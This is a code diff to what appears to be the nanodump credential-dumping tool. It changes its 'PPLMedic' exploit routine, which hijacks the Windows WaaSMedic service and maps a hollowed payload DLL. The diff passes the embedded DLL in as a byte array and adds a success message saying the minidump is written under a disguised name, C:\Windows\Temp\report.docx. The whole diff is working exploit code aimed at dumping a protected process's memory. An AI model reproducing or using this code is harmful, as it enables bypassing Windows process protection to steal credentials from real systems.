@@ -2,14 +2,9 @@
 #include "ppl/ppl_utils.h"
 #include "ppl/ppl_medic_client.h"
 
-#ifdef EXE
- #include "nanodump_ppl_medic_dll.x64.h"
-#endif
-
 BOOL run_ppl_medic_exploit(
-    IN LPCSTR dump_path,
-    IN BOOL use_valid_sig,
-    IN BOOL duplicate_handle)
+    IN unsigned char nanodump_ppl_medic_dll[],
+    IN unsigned int nanodump_ppl_medic_dll_len)
 {
     BOOL       success                      = FALSE;
     BOOL       ret_val                      = FALSE;
@@ -137,7 +132,7 @@ BOOL run_ppl_medic_exploit(
     if (!success)
         goto cleanup;
 
-    success = map_payload_dll(HijackedDllName, HijackedDllSectionPath, &HollowedDllPath, &DllSectionHandle);
+    success = map_payload_dll(nanodump_ppl_medic_dll, nanodump_ppl_medic_dll_len, HijackedDllName, HijackedDllSectionPath, &HollowedDllPath, &DllSectionHandle);
     if (!success)
         goto cleanup;
 
@@ -234,7 +229,7 @@ BOOL run_ppl_medic_exploit(
         {
             if (!is_service_running(STR_WAASMEDIC_SVC))
             {
-                DPRINT_ERR("Service %ls is no longer running, it probably crashed because of an invalid handle value.", STR_WAASMEDIC_SVC);
+                PRINT_ERR("Service %ls is no longer running, it probably crashed because of an invalid handle value.", STR_WAASMEDIC_SVC);
                 goto cleanup;
             }
         }
@@ -248,13 +243,18 @@ BOOL run_ppl_medic_exploit(
     }
 
 cleanup:
-    if (!ret_val && i >= MAX_ATTEMPTS)
+    if (ret_val)
+    {
+        PRINT("The exploit was successfull!");
+        PRINT("By default, the minidump will have an invalid signature and will be written at the path C:\\Windows\\Temp\\report.docx");
+    }
+    else if (!ret_val && i >= MAX_ATTEMPTS)
     {
         PRINT_ERR("Reached the maximum number of attempts.");
     }
     else if (!ret_val)
     {
-        PRINT_ERR("The exploit failed abruptly.");
+        PRINT_ERR("The exploit failed.");
     }
 
     if (StateRegTypeLibModified)
@@ -322,6 +322,8 @@ cleanup:
         intFree(TypeLibPath);
     if (is_service_running(STR_WAASMEDIC_SVC))
         stop_service_by_name(STR_WAASMEDIC_SVC, TRUE);
+
+    DPRINT("bye!")
 
     return ret_val;
 }
@@ -1053,6 +1055,8 @@ cleanup:
 }
 
 BOOL map_payload_dll(
+    IN unsigned char nanodump_ppl_medic_dll[],
+    IN unsigned int nanodump_ppl_medic_dll_len,
     IN LPWSTR HijackedDllName,
     IN LPWSTR HijackedDllSectionPath,
     OUT LPWSTR* HollowedDllPath,
